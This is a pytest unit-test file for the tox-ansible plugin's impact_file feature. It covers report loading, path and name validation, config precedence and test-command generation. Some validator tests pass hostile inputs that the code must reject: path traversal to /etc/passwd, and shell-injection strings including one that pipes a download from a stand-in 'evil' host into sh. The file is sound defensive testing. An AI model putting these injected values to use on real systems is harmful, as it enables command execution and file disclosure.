"""Unit tests for impact_file feature."""

from __future__ import annotations

import io
import json

from pathlib import Path

import pytest

from tox.config.cli.parse import Options
from tox.config.cli.parser import Parsed
from tox.config.main import Config
from tox.config.source import discover_source
from tox.report import ToxHandler
from tox.session.state import State

from tox_ansible.impact import (
    ImpactReport,
    _validate_impact_path,
    _validate_safe_name,
    load_impact_report,
)
from tox_ansible.plugin import (
    Collection,
    _load_ansible_config,
    add_ansible_matrix,
    conf_commands_for_integration,
    conf_commands_for_molecule,
)


def _parsed(**kwargs: object) -> Parsed:
    kwargs.setdefault("override", [])
    kwargs.setdefault("result_json", None)
    return Parsed(**kwargs)


def _make_state(
    config_file: Path,
    *,
    impact_file: str | None = None,
) -> State:
    """Create a tox state for configuration resolution tests.

    Args:
        config_file: The tox configuration file.
        impact_file: Optional CLI impact_file path.

    Returns:
        The configured tox state.
    """
    source = discover_source(config_file, None)
    # CLI uses empty string as default, None means use config file value
    cli_impact_file = impact_file if impact_file is not None else ""
    parsed = _parsed(
        work_dir=config_file.parent / ".tox",
        config_file=config_file,
        root_dir=config_file.parent,
        ansible=True,
        coverage=None,
        impact_file=cli_impact_file,
    )
    output = io.BytesIO()
    wrapper = io.TextIOWrapper(output, encoding="utf-8", line_buffering=True)
    return State(
        options=Options(
            parsed=parsed,
            pos_args="",
            source=source,
            cmd_handlers={},
            log_handler=ToxHandler(level=0, is_colored=False, out_err=(wrapper, wrapper)),
        ),
        args=[],
    )


# =============================================================================
# ImpactReport loading and validation tests
# =============================================================================


class TestValidateImpactPath:
    """Tests for _validate_impact_path function."""

    def test_relative_path_valid(self, tmp_path: Path) -> None:
        _validate_impact_path("tests/integration/targets/foo", tmp_path)

    def test_absolute_path_rejected(self, tmp_path: Path) -> None:
        with pytest.raises(ValueError, match="Absolute paths not allowed"):
            _validate_impact_path("/etc/passwd", tmp_path)

    def test_path_traversal_rejected(self, tmp_path: Path) -> None:
        with pytest.raises(ValueError, match="Path traversal not allowed"):
            _validate_impact_path("../../../etc/passwd", tmp_path)

    def test_hidden_traversal_rejected(self, tmp_path: Path) -> None:
        with pytest.raises(ValueError, match="Path traversal not allowed"):
            _validate_impact_path("tests/../../../etc/passwd", tmp_path)


class TestValidateSafeName:
    """Tests for _validate_safe_name function."""

    def test_valid_alphanumeric(self) -> None:
        _validate_safe_name("s3_bucket", "integration target")
        _validate_safe_name("my-module", "molecule scenario")
        _validate_safe_name("test.scenario", "molecule scenario")
        _validate_safe_name("ModuleName123", "integration target")

    def test_unsafe_shell_injection(self) -> None:
        with pytest.raises(ValueError, match="Unsafe"):
            _validate_safe_name("x';curl evil|sh;'", "integration target")

    def test_unsafe_backticks(self) -> None:
        with pytest.raises(ValueError, match="Unsafe"):
            _validate_safe_name("x`whoami`", "integration target")

    def test_unsafe_spaces(self) -> None:
        with pytest.raises(ValueError, match="Unsafe"):
            _validate_safe_name("my module", "integration target")

    def test_unsafe_semicolon(self) -> None:
        with pytest.raises(ValueError, match="Unsafe"):
            _validate_safe_name("foo;bar", "integration target")


class TestLoadImpactReport:
    """Tests for load_impact_report function."""

    def test_empty_path_returns_none(self, tmp_path: Path) -> None:
        result = load_impact_report("", tmp_path)
        assert result is None

    def test_file_not_found(self, tmp_path: Path) -> None:
        with pytest.raises(SystemExit, match="1"):
            load_impact_report("nonexistent.json", tmp_path)

    def test_invalid_json(self, tmp_path: Path) -> None:
        impact_file = tmp_path / "impact.json"
        impact_file.write_text("{ invalid json }")
        with pytest.raises(SystemExit, match="1"):
            load_impact_report(str(impact_file), tmp_path)

    def test_not_an_object(self, tmp_path: Path) -> None:
        impact_file = tmp_path / "impact.json"
        impact_file.write_text('["list", "not", "object"]')
        with pytest.raises(SystemExit, match="1"):
            load_impact_report(str(impact_file), tmp_path)

    def test_missing_collection_field(self, tmp_path: Path) -> None:
        impact_file = tmp_path / "impact.json"
        impact_file.write_text('{"changed_files": []}')
        with pytest.raises(SystemExit, match="1"):
            load_impact_report(str(impact_file), tmp_path)

    def test_collection_not_string(self, tmp_path: Path) -> None:
        impact_file = tmp_path / "impact.json"
        impact_file.write_text('{"collection": 123}')
        with pytest.raises(SystemExit, match="1"):
            load_impact_report(str(impact_file), tmp_path)

    def test_collection_mismatch(self, tmp_path: Path) -> None:
        impact_file = tmp_path / "impact.json"
        impact_file.write_text('{"collection": "wrong.collection"}')
        collection = Collection(name="test", namespace="test", version="1.0.0")
        with pytest.raises(SystemExit, match="1"):
            load_impact_report(str(impact_file), tmp_path, collection=collection)

    def test_list_field_not_list(self, tmp_path: Path) -> None:
        impact_file = tmp_path / "impact.json"
        impact_file.write_text('{"collection": "test.test", "changed_files": "not a list"}')
        with pytest.raises(SystemExit, match="1"):
            load_impact_report(str(impact_file), tmp_path)

    def test_list_item_not_string(self, tmp_path: Path) -> None:
        impact_file = tmp_path / "impact.json"
        impact_file.write_text('{"collection": "test.test", "changed_files": [123]}')
        with pytest.raises(SystemExit, match="1"):
            load_impact_report(str(impact_file), tmp_path)

    def test_reasons_not_object(self, tmp_path: Path) -> None:
        impact_file = tmp_path / "impact.json"
        impact_file.write_text('{"collection": "test.test", "reasons": "not an object"}')
        with pytest.raises(SystemExit, match="1"):
            load_impact_report(str(impact_file), tmp_path)

    def test_reasons_value_not_list(self, tmp_path: Path) -> None:
        impact_file = tmp_path / "impact.json"
        impact_file.write_text('{"collection": "test.test", "reasons": {"key": "not a list"}}')
        with pytest.raises(SystemExit, match="1"):
            load_impact_report(str(impact_file), tmp_path)

    def test_path_traversal_in_changed_files(self, tmp_path: Path) -> None:
        impact_file = tmp_path / "impact.json"
        impact_file.write_text(
            '{"collection": "test.test", "changed_files": ["../../../etc/passwd"]}'
        )
        with pytest.raises(SystemExit, match="1"):
            load_impact_report(str(impact_file), tmp_path)

    def test_absolute_path_in_integration_targets(self, tmp_path: Path) -> None:
        impact_file = tmp_path / "impact.json"
        impact_file.write_text(
            '{"collection": "test.test", "integration_targets": ["/etc/passwd"]}'
        )
        with pytest.raises(SystemExit, match="1"):
            load_impact_report(str(impact_file), tmp_path)

    def test_valid_report(self, tmp_path: Path) -> None:
        impact_file = tmp_path / "impact.json"
        report_data = {
            "collection": "test.test",
            "changed_files": ["plugins/module_utils/util.py"],
            "affected_plugins": ["test.test.my_module"],
            "molecule_scenarios": ["extensions/molecule/default"],
            "integration_targets": ["tests/integration/targets/my_module"],
            "reasons": {"tests/integration/targets/my_module": ["plugin:test.test.my_module"]},
        }
        impact_file.write_text(json.dumps(report_data))

        result = load_impact_report(str(impact_file), tmp_path)

        assert result is not None
        assert result.collection == "test.test"
        assert result.changed_files == ["plugins/module_utils/util.py"]
        assert result.affected_plugins == ["test.test.my_module"]
        assert result.molecule_scenarios == ["extensions/molecule/default"]
        assert result.integration_targets == ["tests/integration/targets/my_module"]
        assert "tests/integration/targets/my_module" in result.reasons

    def test_valid_report_minimal(self, tmp_path: Path) -> None:
        impact_file = tmp_path / "impact.json"
        impact_file.write_text('{"collection": "test.test"}')

        result = load_impact_report(str(impact_file), tmp_path)

        assert result is not None
        assert result.collection == "test.test"
        assert not result.changed_files
        assert not result.molecule_scenarios
        assert not result.integration_targets

    def test_collection_validation_success(self, tmp_path: Path) -> None:
        impact_file = tmp_path / "impact.json"
        impact_file.write_text('{"collection": "test.test"}')
        collection = Collection(name="test", namespace="test", version="1.0.0")

        result = load_impact_report(str(impact_file), tmp_path, collection=collection)

        assert result is not None
        assert result.collection == "test.test"


# =============================================================================
# Configuration loading tests
# =============================================================================


class TestLoadAnsibleConfigImpactFile:
    """Tests for impact_file in _load_ansible_config."""

    def test_pyproject_impact_file(self, tmp_path: Path) -> None:
        config_file = tmp_path / "pyproject.toml"
        config_file.write_text(
            '[tool.tox]\nrequires = ["tox>=4.2"]\n'
            '[tool.tox-ansible]\nimpact_file = "impact.json"\n'
        )

        result = _load_ansible_config(_make_state(config_file))

        assert result.impact_file == "impact.json"

    def test_ini_impact_file(self, tmp_path: Path) -> None:
        config_file = tmp_path / "tox-ansible.ini"
        config_file.write_text("[ansible]\nimpact_file = impact.json\n")

        result = _load_ansible_config(_make_state(config_file))

        assert result.impact_file == "impact.json"

    def test_cli_impact_file_precedence(self, tmp_path: Path) -> None:
        config_file = tmp_path / "pyproject.toml"
        config_file.write_text(
            '[tool.tox]\nrequires = ["tox>=4.2"]\n'
            '[tool.tox-ansible]\nimpact_file = "config.json"\n'
        )

        result = _load_ansible_config(_make_state(config_file, impact_file="cli.json"))

        assert result.impact_file == "cli.json"

    def test_no_impact_file(self, tmp_path: Path) -> None:
        config_file = tmp_path / "tox-ansible.ini"
        config_file.write_text("[ansible]\n")

        result = _load_ansible_config(_make_state(config_file))

        assert result.impact_file is None


# =============================================================================
# Matrix filtering tests
# =============================================================================


class TestAddAnsibleMatrixImpactFile:
    """Tests for impact_file matrix filtering in add_ansible_matrix."""

    def test_empty_molecule_scenarios_omits_molecule(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        ini_file = tmp_path / "tox-ansible.ini"
        ini_file.write_text("[ansible]\nimpact_file = impact.json\n")
        (tmp_path / "galaxy.yml").write_text("namespace: test\nname: test\nversion: 1.0.0")
        # Create molecule scenarios directory to ensure molecule would normally be included
        molecule_dir = tmp_path / "extensions" / "molecule" / "default"
        molecule_dir.mkdir(parents=True)
        (molecule_dir / "molecule.yml").touch()
        # Create integration targets
        targets_dir = tmp_path / "tests" / "integration" / "targets" / "smoke"
        targets_dir.mkdir(parents=True)
        (targets_dir / "tasks").mkdir()
        (targets_dir / "tasks" / "main.yml").touch()

        # Create impact report with empty molecule_scenarios
        impact_file = tmp_path / "impact.json"
        impact_file.write_text(
            json.dumps(
                {
                    "collection": "test.test",
                    "molecule_scenarios": [],
                    "integration_targets": ["tests/integration/targets/smoke"],
                }
            )
        )

        monkeypatch.chdir(tmp_path)
        state = _make_state(ini_file)

        env_list = add_ansible_matrix(state)

        # No molecule environments
        assert not any(env.startswith("molecule-") for env in env_list.envs)
        # But integration environments are present
        assert any(env.startswith("integration-") for env in env_list.envs)

    def test_empty_integration_targets_omits_integration(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        ini_file = tmp_path / "tox-ansible.ini"
        ini_file.write_text("[ansible]\nimpact_file = impact.json\n")
        (tmp_path / "galaxy.yml").write_text("namespace: test\nname: test\nversion: 1.0.0")
        # Create molecule scenarios
        molecule_dir = tmp_path / "extensions" / "molecule" / "default"
        molecule_dir.mkdir(parents=True)
        (molecule_dir / "molecule.yml").touch()
        # Create integration targets
        targets_dir = tmp_path / "tests" / "integration" / "targets" / "smoke"
        targets_dir.mkdir(parents=True)
        (targets_dir / "tasks").mkdir()
        (targets_dir / "tasks" / "main.yml").touch()

        # Create impact report with empty integration_targets
        impact_file = tmp_path / "impact.json"
        impact_file.write_text(
            json.dumps(
                {
                    "collection": "test.test",
                    "molecule_scenarios": ["extensions/molecule/default"],
                    "integration_targets": [],
                }
            )
        )

        monkeypatch.chdir(tmp_path)
        state = _make_state(ini_file)

        env_list = add_ansible_matrix(state)

        # No integration environments
        assert not any(env.startswith("integration-") for env in env_list.envs)
        # But molecule environments are present
        assert any(env.startswith("molecule-") for env in env_list.envs)

    def test_both_empty_omits_both(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        ini_file = tmp_path / "tox-ansible.ini"
        ini_file.write_text("[ansible]\nimpact_file = impact.json\n")
        (tmp_path / "galaxy.yml").write_text("namespace: test\nname: test\nversion: 1.0.0")
        # Create molecule scenarios
        molecule_dir = tmp_path / "extensions" / "molecule" / "default"
        molecule_dir.mkdir(parents=True)
        (molecule_dir / "molecule.yml").touch()
        # Create integration targets
        targets_dir = tmp_path / "tests" / "integration" / "targets" / "smoke"
        targets_dir.mkdir(parents=True)
        (targets_dir / "tasks").mkdir()
        (targets_dir / "tasks" / "main.yml").touch()

        # Create impact report with both empty
        impact_file = tmp_path / "impact.json"
        impact_file.write_text(
            json.dumps(
                {
                    "collection": "test.test",
                    "molecule_scenarios": [],
                    "integration_targets": [],
                }
            )
        )

        monkeypatch.chdir(tmp_path)
        state = _make_state(ini_file)

        env_list = add_ansible_matrix(state)

        # Neither molecule nor integration environments
        assert not any(env.startswith("molecule-") for env in env_list.envs)
        assert not any(env.startswith("integration-") for env in env_list.envs)
        # But unit, sanity, galaxy are present
        assert any(env.startswith("unit-") for env in env_list.envs)
        assert any(env.startswith("sanity-") for env in env_list.envs)
        assert "galaxy" in env_list.envs

    def test_no_impact_file_preserves_behavior(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        ini_file = tmp_path / "tox-ansible.ini"
        ini_file.write_text("[ansible]\n")
        (tmp_path / "galaxy.yml").write_text("namespace: test\nname: test\nversion: 1.0.0")
        # Create molecule scenarios
        molecule_dir = tmp_path / "extensions" / "molecule" / "default"
        molecule_dir.mkdir(parents=True)
        (molecule_dir / "molecule.yml").touch()
        # Create integration targets
        targets_dir = tmp_path / "tests" / "integration" / "targets" / "smoke"
        targets_dir.mkdir(parents=True)
        (targets_dir / "tasks").mkdir()
        (targets_dir / "tasks" / "main.yml").touch()

        monkeypatch.chdir(tmp_path)
        state = _make_state(ini_file)

        env_list = add_ansible_matrix(state)

        # Both molecule and integration are present (normal discovery)
        assert any(env.startswith("molecule-") for env in env_list.envs)
        assert any(env.startswith("integration-") for env in env_list.envs)


# =============================================================================
# Command generation tests
# =============================================================================


class TestConfCommandsForMoleculeImpact:
    """Tests for molecule command generation with impact_report."""

    def test_no_impact_report_default(self) -> None:
        result = conf_commands_for_molecule(pos_args=None)

        assert result == ["python3 -m molecule test --all"]

    def test_with_molecule_scenarios(self) -> None:
        impact_report = ImpactReport(
            collection="test.test",
            molecule_scenarios=[
                "extensions/molecule/default",
                "extensions/molecule/custom",
            ],
        )

        result = conf_commands_for_molecule(pos_args=None, impact_report=impact_report)

        expected_scenario_count = 2
        assert len(result) == expected_scenario_count
        assert "python3 -m molecule test -s default" in result[0]
        assert "python3 -m molecule test -s custom" in result[1]

    def test_molecule_scenarios_with_append(self) -> None:
        impact_report = ImpactReport(
            collection="test.test",
            molecule_scenarios=["extensions/molecule/default"],
        )

        result = conf_commands_for_molecule(
            pos_args=None,
            molecule_append=["--workers", "4"],
            impact_report=impact_report,
        )

        assert result == ["python3 -m molecule test -s default --workers 4"]

    def test_molecule_scenarios_with_pos_args(self) -> None:
        impact_report = ImpactReport(
            collection="test.test",
            molecule_scenarios=["extensions/molecule/default"],
        )

        result = conf_commands_for_molecule(
            pos_args=("--debug",),
            impact_report=impact_report,
        )

        assert result == ["python3 -m molecule test -s default --debug"]

    def test_molecule_commands_overrides_impact(self) -> None:
        impact_report = ImpactReport(
            collection="test.test",
            molecule_scenarios=["extensions/molecule/default"],
        )

        result = conf_commands_for_molecule(
            pos_args=None,
            molecule_commands=["custom molecule command"],
            impact_report=impact_report,
        )

        assert result == ["custom molecule command"]


class TestConfCommandsForIntegrationImpact:
    """Tests for integration command generation with impact_report."""

    def test_no_impact_report_default(self, tmp_path: Path) -> None:
        config_file = tmp_path / "tox.ini"
        config_file.touch()
        source = discover_source(config_file, None)
        env_conf = Config.make(
            _parsed(work_dir=tmp_path, config_file=config_file, root_dir=tmp_path),
            pos_args=[],
            source=source,
            extra_envs=[],
        ).get_env("integration-py3.14-2.19")
        collection = Collection(name="test", namespace="test", version="1.0.0")

        result = conf_commands_for_integration(
            collection=collection,
            env_conf=env_conf,
            pos_args=None,
        )

        assert len(result) == 1
        assert "pytest" in result[0]

    def test_with_integration_targets(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # Create the target directories so ansible-test style is detected
        targets_dir = tmp_path / "tests" / "integration" / "targets"
        (targets_dir / "s3_bucket").mkdir(parents=True)
        (targets_dir / "s3_object").mkdir(parents=True)
        monkeypatch.chdir(tmp_path)

        config_file = tmp_path / "tox.ini"
        config_file.touch()
        source = discover_source(config_file, None)
        env_conf = Config.make(
            _parsed(work_dir=tmp_path, config_file=config_file, root_dir=tmp_path),
            pos_args=[],
            source=source,
            extra_envs=[],
        ).get_env("integration-py3.14-2.19")
        env_conf.add_config(
            keys=["env_dir", "envdir"],
            of_type=Path,
            default=tmp_path,
            desc="",
        )
        collection = Collection(name="test", namespace="test", version="1.0.0")
        impact_report = ImpactReport(
            collection="test.test",
            integration_targets=[
                "tests/integration/targets/s3_bucket",
                "tests/integration/targets/s3_object",
            ],
        )

        result = conf_commands_for_integration(
            collection=collection,
            env_conf=env_conf,
            pos_args=None,
            impact_report=impact_report,
        )

        assert len(result) == 1
        assert "ansible-test integration" in result[0]
        assert "--local --requirements" in result[0]
        assert "--python 3.14" in result[0]
        assert "s3_bucket" in result[0]
        assert "s3_object" in result[0]

    def test_integration_targets_with_pos_args(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # Create the target directory so ansible-test style is detected
        targets_dir = tmp_path / "tests" / "integration" / "targets"
        (targets_dir / "my_module").mkdir(parents=True)
        monkeypatch.chdir(tmp_path)

        config_file = tmp_path / "tox.ini"
        config_file.touch()
        source = discover_source(config_file, None)
        env_conf = Config.make(
            _parsed(work_dir=tmp_path, config_file=config_file, root_dir=tmp_path),
            pos_args=[],
            source=source,
            extra_envs=[],
        ).get_env("integration-py3.14-2.19")
        env_conf.add_config(
            keys=["env_dir", "envdir"],
            of_type=Path,
            default=tmp_path,
            desc="",
        )
        collection = Collection(name="test", namespace="test", version="1.0.0")
        impact_report = ImpactReport(
            collection="test.test",
            integration_targets=["tests/integration/targets/my_module"],
        )

        result = conf_commands_for_integration(
            collection=collection,
            env_conf=env_conf,
            pos_args=("-v", "--docker"),
            impact_report=impact_report,
        )

        assert len(result) == 1
        assert "-v --docker" in result[0]
        assert "my_module" in result[0]

    def test_integration_targets_missing_falls_back_to_pytest(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # Don't create target directories - simulates pytest-style integration
        monkeypatch.chdir(tmp_path)

        config_file = tmp_path / "tox.ini"
        config_file.touch()
        source = discover_source(config_file, None)
        env_conf = Config.make(
            _parsed(work_dir=tmp_path, config_file=config_file, root_dir=tmp_path),
            pos_args=[],
            source=source,
            extra_envs=[],
        ).get_env("integration-py3.14-2.19")
        collection = Collection(name="test", namespace="test", version="1.0.0")
        impact_report = ImpactReport(
            collection="test.test",
            integration_targets=["tests/integration/targets/nonexistent"],
        )

        result = conf_commands_for_integration(
            collection=collection,
            env_conf=env_conf,
            pos_args=None,
            impact_report=impact_report,
        )

        # Should fall back to pytest since targets don't exist
        assert len(result) == 1
        assert "pytest" in result[0]
        assert "ansible-test" not in result[0]
